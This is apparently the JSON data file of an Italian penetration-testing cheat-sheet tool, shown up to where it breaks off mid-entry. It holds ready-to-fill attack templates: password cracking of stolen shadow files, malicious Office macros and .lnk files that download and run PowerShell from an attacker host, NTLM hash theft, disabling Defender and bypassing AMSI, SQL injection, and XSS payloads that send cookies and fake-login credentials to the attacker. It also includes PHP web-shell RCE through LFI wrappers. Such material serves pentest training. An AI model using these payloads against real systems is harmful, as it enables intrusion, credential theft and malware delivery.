    "subcategory": "offline-crack",
    "group": "hashcat",
    "description": "Le tre modalità principali di hashcat oltre al dizionario semplice: dizionario con regole (copre le mutazioni comuni), mask per bruteforce mirato su pattern noti, e combinator per unire due wordlist.",
    "note": "# Strategia\nParti sempre da dizionario più regole (best64): è la resa migliore. Passa a mask solo se conosci il pattern (per esempio Stagione+anno+simbolo). Il bruteforce puro è l'ultima risorsa.\n# Errori comuni\nIl mode sbagliato produce zero risultati, in silenzio: verifica prima con l'identificazione dell'hash.",
    "platform": "cross-platform",
    "requires": [
      "hash"
    ],
    "protocols": [],
    "tags": [
      "hashcat",
      "rules",
      "mask",
      "cracking"
    ],
    "template": "# dizionario piu regole (punto di partenza)\nhashcat -m <mode> <hashfile> <wordlist> -r /usr/share/hashcat/rules/best64.rule",
    "params": [
      {
        "key": "mode",
        "label": "Mode",
        "placeholder": "1000"
      },
      {
        "key": "hashfile",
        "label": "File hash",
        "placeholder": "hashes.txt"
      },
      {
        "key": "wordlist",
        "label": "Wordlist",
        "placeholder": "/usr/share/wordlists/rockyou.txt"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Dizionario + regole",
        "template": "hashcat -m <mode> <hashfile> <wordlist> -r /usr/share/hashcat/rules/best64.rule",
        "description": "Dizionario con mutazioni best64."
      },
      {
        "id": "mask",
        "label": "Mask (bruteforce)",
        "template": "hashcat -m <mode> -a 3 <hashfile> '?u?l?l?l?l?d?d?d!'",
        "description": "Bruteforce su un pattern noto (maiuscola, minuscole, cifre, simbolo)."
      },
      {
        "id": "combinator",
        "label": "Combinator",
        "template": "hashcat -m <mode> -a 1 <hashfile> <wordlist> <wordlist>",
        "description": "Concatena le parole di due wordlist."
      }
    ]
  },
  {
    "id": "unshadow-crack",
    "name": "Crack hash di sistema Linux (unshadow)",
    "category": "exploitation",
    "subcategory": "offline-crack",
    "group": "Hash di sistema",
    "description": "Dai file /etc/passwd e /etc/shadow rubati su un host Linux si ricostruiscono gli hash utente e li si cracca. Gli hash moderni sono sha512crypt (mode 1800).",
    "note": "# Prossimo passo\nUna password di root o di un utente con sudo craccata vale un accesso diretto. Riusa le password trovate anche su altri servizi e host (password reuse).\n# Errori comuni\nsha512crypt è lento: usa una wordlist mirata e regole, non il bruteforce. Identifica il prefisso: `$6$` è sha512crypt, `$y$` è yescrypt (mode 29100).",
    "platform": "linux",
    "requires": [
      "hash"
    ],
    "protocols": [],
    "tags": [
      "unshadow",
      "john",
      "hashcat",
      "linux",
      "cracking"
    ],
    "template": "# unisci passwd e shadow, poi cracca (sha512crypt = mode 1800)\nunshadow passwd.txt shadow.txt > unshadowed.txt\nhashcat -m 1800 unshadowed.txt <wordlist>",
    "params": [
      {
        "key": "wordlist",
        "label": "Wordlist",
        "placeholder": "/usr/share/wordlists/rockyou.txt"
      }
    ]
  },
  {
    "id": "john-2john",
    "name": "john — *2john + crack",
    "category": "exploitation",
    "subcategory": "offline-crack",
    "group": "File protetti",
    "description": "Estrae l'hash da un file protetto con uno script `*2john`, che poi viene craccato.\n`locate *2john*` elenca tutti gli script disponibili.",
    "platform": "linux",
    "requires": [
      "hash"
    ],
    "protocols": [],
    "tags": [
      "john",
      "2john",
      "cracking"
    ],
    "template": "ssh2john id_rsa > hash.txt; john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "SSH key",
        "template": "ssh2john id_rsa > hash.txt; john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
        "description": "Passphrase di una chiave SSH privata."
      },
      {
        "id": "zip",
        "label": "ZIP",
        "template": "zip2john file.zip > hash.txt; john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
        "description": "Archivio ZIP protetto."
      },
      {
        "id": "keepass",
        "label": "KeePass",
        "template": "keepass2john file.kdbx > hash.txt; john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
        "description": "Database KeePass `.kdbx`."
      },
      {
        "id": "office",
        "label": "Office",
        "template": "office2john file.docx > hash.txt; john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
        "description": "Documento Office protetto."
      },
      {
        "id": "pdf",
        "label": "PDF",
        "template": "pdf2john file.pdf > hash.txt; john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
        "description": "PDF protetto da password."
      }
    ],
    "note": "# Come funziona\nLo script `*2john` converte il file protetto in un hash che john o hashcat sanno craccare. Lo script giusto dipende dal tipo di file (`ssh2john`, `zip2john`, `keepass2john`, `office2john`, `pdf2john`); `locate *2john*` li elenca tutti.\n# Prossimo passo\nLa passphrase o password craccata sblocca la chiave SSH, l'archivio o il database: usala per l'accesso o per estrarre altri segreti."
  },
  {
    "id": "client-macro",
    "name": "Office — macro VBA malevola",
    "category": "exploitation",
    "subcategory": "client-side",
    "group": "Office Macro",
    "description": "Un documento Office con una macro VBA esegue codice quando la vittima abilita le macro. Si genera lo scheletro VBA con msfvenom, lo si incolla nell'editor macro (Alt+F11) di un.doc o.xls in vecchio formato binario, e si imposta l'auto-esecuzione con `AutoOpen`/`Document_Open`. Alla peggio la macro scarica ed esegue un secondo stadio.",
    "platform": "windows",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "macro",
      "vba",
      "phishing",
      "client-side"
    ],
    "template": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f vba -o macro.vba",
    "params": [
      {
        "key": "lhost",
        "label": "LHOST",
        "placeholder": "10.10.14.5"
      },
      {
        "key": "lport",
        "label": "LPORT",
        "placeholder": "443"
      }
    ],
    "variants": [
      {
        "id": "msf",
        "label": "Genera VBA (msfvenom)",
        "template": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f vba -o macro.vba",
        "description": "Produce il codice VBA da incollare nell'editor macro. Va salvato in formato.doc/.xls (macro-enabled) e serve un handler in ascolto. Auto-run tramite `Sub AutoOpen()` / `Sub Document_Open()`."
      },
      {
        "id": "downloader",
        "label": "Macro downloader",
        "template": "# VBA minimale: scarica ed esegue un secondo stadio\n# Sub AutoOpen()\n#   Dim s: s = \"powershell -nop -w hidden -c \"\"IEX(New-Object Net.WebClient).DownloadString('http://<lhost>/a.ps1')\"\"\"\n#   CreateObject(\"WScript.Shell\").Run s, 0, False\n# End Sub",
        "description": "Invece di embeddare lo shellcode, la macro tira giù ed esegue uno script PowerShell dal tuo server: payload più piccolo e più facile da modificare per l'evasione AV."
      }
    ],
    "note": "# Prerequisiti\nUn listener o handler in ascolto e una vittima che abiliti le macro. I formati binari legacy (`.doc`, `.xls`) supportano meglio l'auto-esecuzione.\n# Errori comuni\nOffice recente blocca le macro nei file scaricati da Internet (Mark of the Web): serve una consegna credibile e spesso un pretesto per far togliere il blocco. Il downloader a secondo stadio evade l'AV meglio del VBA con shellcode embeddato.\n# Prossimo passo\nRicevuta la shell, stabilizzala e parti con l'enumerazione locale per la privilege escalation."
  },
  {
    "id": "client-lnk",
    "name": "SMB Attack — .lnk / .Library-ms",
    "category": "exploitation",
    "subcategory": "client-side",
    "group": "Shortcut & Library",
    "description": "Due vettori client-side su Windows:\n1. un file `.lnk` (collegamento) può eseguire comandi quando la vittima lo apre, oppure rubare l'hash NTLMv2 senza alcun click: se il suo `IconLocation` punta a una share UNC dell'attaccante, Explorer vi si autentica appena si apre la cartella che lo contiene.\n2. un file `.Library-ms` monta invece in Explorer una share WebDAV controllata dall'attaccante e, con un `.lnk` al suo interno, porta all'esecuzione o alla cattura dell'hash.",
    "platform": "windows",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "smb",
      "http"
    ],
    "tags": [
      "lnk",
      "library-ms",
      "scf",
      "ntlm",
      "responder",
      "webdav",
      "phishing",
      "client-side"
    ],
    "template": "# .lnk che forza l'autenticazione: TargetPath e IconLocation sulla tua share SMB\n$s=(New-Object -ComObject WScript.Shell).CreateShortcut(\"$PWD\\@invoice.lnk\")\n$s.TargetPath=\"\\\\<lhost>\\share\\x\"\n$s.IconLocation=\"\\\\<lhost>\\share\\x\"\n$s.Save()",
    "params": [
      {
        "key": "lhost",
        "label": "LHOST",
        "placeholder": "10.10.14.5"
      }
    ],
    "variants": [
      {
        "id": "ntlm",
        "label": ".lnk furto NTLMv2 (no click)",
        "template": "# .lnk che forza l'autenticazione: TargetPath e IconLocation sulla tua share SMB\n$s=(New-Object -ComObject WScript.Shell).CreateShortcut(\"$PWD\\@invoice.lnk\")\n$s.TargetPath=\"\\\\<lhost>\\share\\x\"\n$s.IconLocation=\"\\\\<lhost>\\share\\x\"\n$s.Save()",
        "description": "Furto dell'hash NTLMv2 senza click: Explorer risolve l'icona via UNC appena apre la cartella. Il prefisso `@` mette il file in cima. Cattura con Responder o Inveigh."
      },
      {
        "id": "scf",
        "label": ".scf furto NTLM (Windows vecchi)",
        "template": "# .scf — solo Windows precedenti a 10 1709 / Server 2016. Salva come @legit.scf nella share che la vittima naviga.\n[Shell]\nCommand=2\nIconFile=\\\\<lhost>\\share\\x.ico\n[Taskbar]\nCommand=ToggleDesktop",
        "description": "Legacy: stesso furto NTLM del `.lnk`, ma via file `.scf`. Funziona solo prima di Windows 10 1709 e Server 2016; dopo è stato patchato, usa il `.lnk`."
      },
      {
        "id": "lnk",
        "label": ".lnk esecuzione (click)",
        "template": "$s=(New-Object -ComObject WScript.Shell).CreateShortcut(\"$PWD\\invoice.lnk\")\n$s.TargetPath=\"powershell.exe\"\n$s.Arguments=\"-nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://<lhost>/a.ps1')\"\n$s.IconLocation=\"shell32.dll,70\"\n$s.Save()",
        "description": "Esecuzione di comandi quando la vittima apre il collegamento: lancia un downloader PowerShell verso il tuo host. L'icona `shell32.dll,70` lo fa sembrare un documento."
      },
      {
        "id": "libraryms",
        "label": ".Library-ms (WebDAV)",
        "template": "# 1. share WebDAV anonima sul tuo host\nwsgidav --host=0.0.0.0 --port=80 --root=./share --auth=anonymous\n\n# 2. crea un file .Library-ms che punta a \\\\<lhost>\\share (URL nell'elemento simpleLocation; XML completo su PayloadsAllTheThings)\n\n# 3. dentro ./share metti un .lnk: la vittima apre il .Library-ms, vede la share e lancia il .lnk",
        "description": "Monta una share WebDAV dell'attaccante in Explorer; il `.lnk` interno esegue o coercizza l'auth. Richiede il servizio WebClient attivo sulla vittima (workstation per default, Server no)."
      }
    ],
    "note": "# Quale file usare\n- **.lnk, furto NTLM**: la vittima apre solo la cartella e l'hash NTLMv2 viene catturato, senza click. Prima scelta, valido su ogni Windows moderno.\n- **.lnk, esecuzione**: la vittima clicca il collegamento ed esegue un downloader PowerShell.\n- **.Library-ms (WebDAV)**: quando vuoi montare una share WebDAV lato vittima. Richiede il servizio WebClient, attivo di default solo sulle workstation (Windows 10 e 11), non su Windows Server.\n- **.scf**: la vecchia via per il furto NTLM, solo su Windows precedenti a 10 1709 e Server 2016. Dopo è stato patchato: oggi usa il .lnk.\n# Prerequisiti\n- Consegna alla vittima (email o share interna scrivibile) con un nome credibile; il prefisso `@` ordina il file in cima alla cartella, così Explorer lo incontra per primo.\n- Per il furto NTLM serve un listener Responder o Inveigh sulla tua share SMB.\n# Passaggi (furto NTLMv2, senza click)\n- Avvia il listener: `responder -I tun0` oppure Inveigh.\n- Crea il `.lnk` con `TargetPath` e `IconLocation` verso la tua share SMB (variante furto NTLM); su Windows vecchi, in alternativa, il `.scf`.\n- Copialo nella share che la vittima naviga: aprendo la cartella arriva il challenge NTLMv2.\n# Prossimo passo\nL'hash NTLMv2 si cracca offline (hashcat mode 5600) oppure si rilancia in relay (ntlmrelayx) se l'SMB signing non è obbligatorio. Con l'esecuzione (click o WebDAV) ricevi la shell e stabilizzi."
  },
  {
    "id": "av-defender",
    "name": "Defender — disattiva / AMSI bypass",
    "category": "exploitation",
    "subcategory": "av-bypass",
    "group": "Defender & AMSI",
    "description": "Riduci le difese prima di caricare i tool. Disattivare il real-time o escludere un path richiede admin; l’AMSI bypass gira in memoria e va eseguito PRIMA di caricare lo script.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "defender",
      "amsi",
      "av-bypass"
    ],
    "template": "Set-MpPreference -DisableRealtimeMonitoring $true",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "Disattiva real-time",
        "template": "Set-MpPreference -DisableRealtimeMonitoring $true",
        "description": "Spegne la protezione in tempo reale (serve admin). Rumoroso."
      },
      {
        "id": "exclude",
        "label": "Escludi path",
        "template": "Add-MpPreference -ExclusionPath \"C:\\Temp\"",
        "description": "Esclude una cartella dalla scansione: caricaci i tool."
      },
      {
        "id": "amsi",
        "label": "AMSI bypass",
        "template": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
        "description": "Disabilita AMSI in memoria; va eseguito prima di caricare qualsiasi script PowerShell. Gli one-liner pubblici sono spesso firmati: offuscali."
      }
    ],
    "note": "# Attenzione\nDisattivare la protezione in tempo reale è rumoroso e lascia tracce (event log, allarmi SIEM). Dove puoi, preferisci un'esclusione di path o il bypass AMSI in memoria, meno appariscenti.\n# Errori comuni\nMolti one-liner AMSI pubblici sono ormai firmati dagli AV: vanno offuscati (variabili rinominate, stringhe spezzate) per passare."
  },
  {
    "id": "sqli-detect",
    "name": "SQLi — detection manuale",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "group": "SQL Injection",
    "description": "Payload veloci per capire se un parametro è iniettabile. Si parte da un apice `'` per rompere la query: un errore SQL o una pagina diversa dal normale è già un segnale. Poi si conferma la logica booleana (una condizione vera e una falsa danno risposte diverse) oppure, quando non c'è output visibile, il ritardo temporale con SLEEP (blind).",
    "note": "# Output atteso\n- boolean: la risposta cambia tra condizione vera e falsa (testo, lunghezza, codice di stato)\n- error-based: compare un errore SQL che rivela anche il DBMS\n- time-based: la risposta tarda quanto il valore di SLEEP, pur senza output visibile\n# Errori comuni\nIl contesto decide la sintassi: valore tra apici richiede `'`, numerico nessun apice, tra doppi apici richiede `\"`. I commenti variano per DBMS: `-- -` e `#` su MySQL, `--` su MSSQL, Oracle e PostgreSQL.\n# Prossimo passo\nConfermata l'injection, conta le colonne e passa a union-based, oppure lascia il lavoro a sqlmap.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "sqli",
      "manual"
    ],
    "template": "' OR 1=1-- -",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "Boolean",
        "template": "' OR 1=1-- -",
        "description": "Se la pagina cambia rispetto al normale, il parametro è iniettabile."
      },
      {
        "id": "and",
        "label": "AND true/false",
        "template": "' AND 1=1-- -",
        "description": "Confronta con \"AND 1=2\": risposte diverse = blind boolean-based."
      },
      {
        "id": "union-null",
        "label": "UNION NULL",
        "template": "' UNION SELECT NULL-- -",
        "description": "Si aggiungono NULL finché l'errore sparisce: il numero raggiunto è quello delle colonne."
      },
      {
        "id": "sleep",
        "label": "Time-based",
        "template": "' AND SLEEP(5)-- -",
        "description": "Se la risposta tarda 5s è iniettabile anche senza output (blind)."
      },
      {
        "id": "auth-bypass",
        "label": "Auth bypass (login)",
        "template": "admin'-- -",
        "description": "In un form di login commenta il controllo della password con -- -: con username noto (admin) entri come quell’utente; con ' OR 1=1-- - prendi il primo utente della tabella. SQLi come bypass di autenticazione, non solo estrazione dati."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — SQL Injection",
        "url": "https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html"
      }
    ]
  },
  {
    "id": "sqli-union",
    "name": "SQLi — union-based",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "group": "SQL Injection",
    "description": "Quando la injection è in un punto che mostra output, union-based estrae i dati direttamente a schermo. Prima si conta il numero di colonne con `ORDER BY` (o aggiungendo NULL finché l'errore sparisce), poi si individua quale colonna è visibile e vi si inseriscono versione del DBMS, nomi di database, tabelle e colonne letti da `information_schema`.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "sqli",
      "union"
    ],
    "template": "' ORDER BY 1-- -",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "ORDER BY",
        "template": "' ORDER BY 1-- -",
        "description": "Il numero va incrementato finché la query non dà errore: il valore raggiunto indica quante colonne ci sono."
      },
      {
        "id": "union",
        "label": "UNION version",
        "template": "' UNION SELECT 1,@@version,3-- -",
        "description": "Stampa la versione DB nella colonna visibile (qui la seconda)."
      },
      {
        "id": "crossdb",
        "label": "Cheat cross-DB",
        "template": "-- MySQL: @@version, information_schema.tables, LOAD_FILE('/etc/passwd')\n-- MSSQL: @@version, information_schema.tables, xp_cmdshell\n-- Oracle: SELECT banner FROM v$version, all_tables\n-- PostgreSQL: version(), pg_tables, pg_read_file('/etc/passwd')",
        "description": "Funzioni equivalenti sui principali DBMS."
      }
    ],
    "note": "# Prerequisiti\nServe una injection già confermata e una query che restituisce il risultato a schermo. Il numero di colonne della UNION deve combaciare con quello della query originale, altrimenti dà errore.\n# Prossimo passo\nTrovata la colonna visibile, enumera lo schema: `information_schema.tables` per le tabelle, `information_schema.columns` per le colonne, poi scarica i dati. Su MySQL e PostgreSQL valuta la lettura di file (`LOAD_FILE`, `pg_read_file`); su MSSQL `xp_cmdshell`."
  },
  {
    "id": "sqlmap",
    "name": "sqlmap — automatizzato",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "group": "SQL Injection",
    "description": "Automatizza detection ed estrazione delle SQLi su tutti i DBMS principali.\n- `--batch` usa i default, senza domande interattive\n- `--dbs` elenca i database, poi si scende a tabelle e dump\n- `--os-shell` tenta la RCE sul DBMS",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "sqlmap",
      "sqli"
    ],
    "template": "sqlmap -u \"http://<ip>/page?id=1\" --batch --dbs",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "db",
        "label": "Database",
        "placeholder": "app"
      },
      {
        "key": "table",
        "label": "Table",
        "placeholder": "users"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Enum DB",
        "template": "sqlmap -u \"http://<ip>/page?id=1\" --batch --dbs",
        "description": "Elenca i database."
      },
      {
        "id": "tables",
        "label": "Tabelle",
        "template": "sqlmap -u \"http://<ip>/page?id=1\" --batch -D <db> --tables",
        "description": "Tabelle del database scelto."
      },
      {
        "id": "dump",
        "label": "Dump",
        "template": "sqlmap -u \"http://<ip>/page?id=1\" --batch -D <db> -T <table> --dump",
        "description": "Estrae i dati della tabella."
      },
      {
        "id": "osshell",
        "label": "OS shell",
        "template": "sqlmap -u \"http://<ip>/page?id=1\" --batch --os-shell",
        "description": "Tenta una shell sul DBMS (serve privilegio FILE o stacked queries)."
      },
      {
        "id": "burp",
        "label": "Da request Burp",
        "template": "sqlmap -r request.txt --batch --dbs",
        "description": "Usa una request salvata: gestisce header, cookie e POST automaticamente."
      }
    ],
    "note": "# Scegliere il parametro da iniettare\n- `-p <param>` testa solo quel parametro, più veloce che provarli tutti (per esempio `-p id`)\n- `*` marca a mano il punto di injection dove serve, che sia un path REST, un header o un valore JSON: per esempio `/api/user/1*` oppure `id=1*` in una request salvata con `-r`\n# Opzioni utili\n- `--level 5 --risk 3` allargano i test: più payload, ma più lenti\n- `--random-agent` e un `--tamper` adatto aiutano contro WAF e filtri\n- `-D <db> -T <table> -C <col> --dump` scende fino ai dati\n# Errori comuni\nUn 403 o risposte incoerenti indicano spesso un WAF: prova `--random-agent`, un `--tamper` adatto e un `--delay`. Senza un punto di injection valido sqlmap non trova nulla: parti da `-r request.txt` così rispetta header, cookie e sessione.",
    "refs": [
      {
        "label": "HackTricks — sqlmap",
        "url": "https://book.hacktricks.wiki/en/pentesting-web/sql-injection/sqlmap.html"
      }
    ]
  },
  {
    "id": "xss-detect",
    "name": "XSS — detection e contesto",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "group": "XSS",
    "description": "Conferma che un input esegua JavaScript nel browser della vittima. Prima si capisce il tipo: stored (il payload resta salvato e scatta per ogni visitatore, il più grave), reflected (torna nella risposta a una request preparata) o DOM-based (elaborato solo lato client, non tocca il server). Poi si individua il contesto in cui l'input finisce e si sceglie un payload che ne esce.",
    "note": "# Output atteso\nUn popup con l'origine conferma l'esecuzione. Se il payload resta e scatta a ogni visita è stored; se serve un link preparato è reflected; se non passa mai dal server è DOM-based.\n# Errori comuni\nFiltri sul tag `<script>`: ripiega sugli event handler (`onerror`, `onload`), varia le maiuscole o l'encoding. Una CSP restrittiva può bloccare l'esecuzione inline anche quando l'iniezione riesce.\n# Prossimo passo\nConfermata la XSS, passa all'exploit (furto sessione, phishing, blind) oppure automatizza con dalfox.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "xss",
      "reflected",
      "stored",
      "dom",
      "manual"
    ],
    "template": "<script>alert(document.domain)</script>",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "tag script",
        "template": "<script>alert(document.domain)</script>",
        "description": "Conferma l'esecuzione mostrando l'origine. Il popup indica che l'input è vulnerabile."
      },
      {
        "id": "event",
        "label": "event handler",
        "template": "<img src=x onerror=alert(document.domain)>",
        "description": "Quando `<script>` è filtrato, l'handler di errore esegue comunque. Vale anche `<svg onload=alert(document.domain)>`."
      },
      {
        "id": "attr",
        "label": "breakout da attributo",
        "template": "\"><svg onload=alert(document.domain)>",
        "description": "Se l'input finisce dentro un attributo HTML, prima si chiude virgoletta e tag, poi si inietta."
      },
      {
        "id": "dom",
        "label": "DOM-based",
        "template": "#<img src=x onerror=alert(document.domain)>",
        "description": "Sorgente lato client come `location.hash` che finisce in un sink come `innerHTML`: il payload non passa dal server."
      }
    ]
  },
  {
    "id": "xss-exploit",
    "name": "XSS — session hijacking e abuso",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "group": "XSS",
    "description": "Trasforma una XSS confermata in impatto concreto: rubare il cookie di sessione, raccogliere credenziali con un finto login o confermare una XSS cieca che scatta altrove (pannello admin, log).",
    "note": "# Prerequisiti\nServe una XSS già confermata e un server in ascolto sul tuo host per ricevere i dati: `php -S 0.0.0.0:80` oppure `python3 -m http.server 80`.\n# Errori comuni\nCol flag HttpOnly il cookie non è leggibile da `document.cookie`: in quel caso la XSS si usa per compiere azioni come la vittima (richieste autenticate, CSRF) invece di rubare il cookie.\n# Prossimo passo\nCol cookie di sessione riusa l'identità della vittima nel browser o in `curl`; con la blind XSS mappa dove esegue per capire quale utente stai colpendo.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "xss",
      "session-hijacking",
      "cookie",
      "blind",
      "phishing"
    ],
    "template": "<script>new Image().src='http://<lhost>/?c='+document.cookie</script>",
    "params": [
      {
        "key": "lhost",
        "label": "LHOST",
        "placeholder": "10.10.14.3"
      }
    ],
    "variants": [
      {
        "id": "cookie",
        "label": "furto cookie (Image)",
        "template": "<script>new Image().src='http://<lhost>/?c='+document.cookie</script>",
        "description": "Esfiltra `document.cookie` verso il tuo host: il cookie compare nei log del server in ascolto."
      },
      {
        "id": "fetch",
        "label": "furto cookie (fetch)",
        "template": "<script>fetch('http://<lhost>/?c='+document.cookie)</script>",
        "description": "Variante moderna con fetch, meno rumorosa di una redirect. Stesso risultato."
      },
      {
        "id": "blind",
        "label": "blind XSS (callback)",
        "template": "<script src=http://<lhost>/hook.js></script>",
        "description": "Per XSS cieca: il payload scatta dove non vedi. Il tuo server registra quando e da dove parte la richiesta."
      },
      {
        "id": "phishing",
        "label": "phishing / finto login",
        "template": "<script>document.body.innerHTML=\"<form action=http://<lhost>/ method=POST>Sessione scaduta<br><input name=u placeholder=user><input name=p type=password><input type=submit></form>\"</script>",
        "description": "Sostituisce la pagina con un finto login che invia le credenziali al tuo host."
      }
    ]
  },
  {
    "id": "xss-dalfox",
    "name": "dalfox — XSS automatizzato",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "group": "XSS",
    "description": "Automatizza detection ed exploit delle XSS: dalfox prova i parametri, verifica davvero l'esecuzione (non solo il reflection) e gestisce encoding e WAF. XSStrike è l'alternativa classica.",
    "note": "# Opzioni utili\n- `-b <host>` abilita i payload blind verso un tuo host\n- `--custom-payload file.txt` usa payload personalizzati\n- `--waf-evasion` e `--delay` aiutano contro i filtri\n# Prossimo passo\nConferma a mano i finding e passa all'exploit (furto sessione o blind).",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "xss",
      "dalfox",
      "xsstrike",
      "scanner",
      "automated"
    ],
    "template": "dalfox url \"http://<ip>/page?q=test\"",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "lhost",
        "label": "Blind host",
        "placeholder": "xss.tuo.host"
      }
    ],
    "variants": [
      {
        "id": "url",
        "label": "URL singolo",
        "template": "dalfox url \"http://<ip>/page?q=test\"",
        "description": "Testa i parametri dell'URL, verifica l'esecuzione e gestisce encoding e WAF."
      },
      {
        "id": "pipe",
        "label": "da stdin / lista",
        "template": "echo \"http://<ip>/?q=1\" | dalfox pipe",
        "description": "Accetta URL dallo standard input; con `dalfox file urls.txt` legge una lista."
      },
      {
        "id": "blind",
        "label": "con callback blind",
        "template": "dalfox url \"http://<ip>/?q=test\" -b <lhost>",
        "description": "Aggiunge il payload blind che richiama il tuo host quando scatta altrove."
      }
    ]
  },
  {
    "id": "lfi",
    "name": "LFI — path traversal",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "group": "File Inclusion",
    "description": "Risali le directory per leggere file di sistema. Su Windows usa i backslash. Combinala con i wrapper PHP per leggere sorgenti o ottenere RCE.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "lfi",
      "path-traversal"
    ],
    "template": "http://<ip>/page?file=../../../../etc/passwd",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "/etc/passwd",
        "template": "http://<ip>/page?file=../../../../etc/passwd",
        "description": "Lettura classica su Linux."
      },
      {
        "id": "shadow",
        "label": "/etc/shadow",
        "template": "http://<ip>/page?file=../../../../etc/shadow",
        "description": "Hash delle password (serve permesso di lettura, raro)."
      },
      {
        "id": "windows",
        "label": "Windows hosts",
        "template": "http://<ip>/page?file=..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "description": "Path traversal su Windows (backslash)."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — File Inclusion",
        "url": "https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html"
      }
    ],
    "note": "# Output atteso\nIl contenuto del file richiesto compare nella risposta (per esempio le righe di `/etc/passwd`). Un errore o una pagina vuota indicano filtri o path sbagliato.\n# Errori comuni\nSe il traversal è filtrato prova encoding (`..%2f`, doppio encoding `..%252f`), path assoluto o, su versioni PHP datate, il null byte `%00`. Su Windows usa i backslash e path tipo `C:\\Windows\\...`.\n# Prossimo passo\nLeggi config e chiavi; per arrivare alla RCE combina con i wrapper PHP o con il log poisoning."
  },
  {
    "id": "lfi-wrappers",
    "name": "LFI — PHP wrappers",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "group": "File Inclusion",
    "description": "I wrapper PHP trasformano una LFI in lettura del sorgente (`php://filter`) o in esecuzione di codice PHP (`php://input`, `data://`). La RCE con input/data richiede `allow_url_include=On`; il filter no.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "lfi",
      "php",
      "wrapper"
    ],
    "template": "http://<ip>/page?file=php://filter/convert.base64-encode/resource=index.php",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "filter (base64)",
        "template": "http://<ip>/page?file=php://filter/convert.base64-encode/resource=index.php",
        "description": "Legge il sorgente di `index.php` in base64 (poi lo decodifichi). Non esegue nulla, quindi non serve `allow_url_include`."
      },
      {
        "id": "input",
        "label": "php://input",
        "template": "curl -s \"http://<ip>/page?file=php://input&cmd=id\" --data '<?php system($_GET[\"cmd\"]); ?>'",
        "description": "Il PHP va nel body POST (`--data`) e `php://input` lo esegue; il comando arriva da `&cmd=`. Non funziona da browser (serve il POST). Richiede `allow_url_include=On`."
      },
      {
        "id": "data",
        "label": "data://",
        "template": "http://<ip>/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id",
        "description": "La base64 è `<?php system($_GET['cmd']);?>`; il comando arriva da `&cmd=`. Richiede `allow_url_include=On`."
      }
    ],
    "note": "# Output atteso\n`php://filter` restituisce il sorgente codificato in base64 (va decodificato); `php://input` e `data://` eseguono il codice PHP che gli passi.\n# Prerequisiti\nLa RCE via `data://` richiede `allow_url_include=On`; `php://input` vuole il codice nel body della richiesta POST.\n# Prossimo passo\nDal sorgente letto cerca credenziali e altre vulnerabilità; con `php://input` o `data://` ottieni RCE diretta."
  },
  {
    "id": "lfi-logpoison",
    "name": "LFI — log poisoning, RCE",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "group": "File Inclusion",
